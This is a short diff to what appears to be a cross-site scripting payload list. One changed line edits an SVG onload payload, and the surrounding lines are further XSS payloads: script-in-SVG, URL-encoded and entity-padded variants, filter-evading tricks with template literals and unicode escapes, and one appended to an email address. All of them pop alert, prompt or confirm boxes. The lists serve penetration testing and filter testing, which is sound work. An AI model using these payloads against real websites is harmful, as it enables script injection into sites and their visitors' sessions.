@@ -49,7 +49,7 @@ a onclick="alert(1)">XSS</a>
 /svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" onload="alert('XSS via SVG!')"><circle cx="50" cy="50" r="40" stroke="black" stroke-width="3" fill="red" /></svg>
 <svg xmlns="http://www.w3.org/2000/svg"><script>prompt("XSS")</script></svg>
 "><svg/onload=setTimeout`${'ale'+'rt'}(1)`>
-/<jxahmad282>=()?><svg/onload​=\u0063onfirm('hackedbyhunter')>
+/<jxahmad282>=()?><svg/onload=\u0063onfirm('hacked_by_hunter')>
 %3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%3Cscript%3Eprompt%28%22XSS%22%29%3C%2Fscript%3E%3C%2Fsvg%3E
 <svg+onload%3Dalert%26%230000000040+"1")> –
 ab@gmail.com'\"><svg/onload=alert(/xss/)>
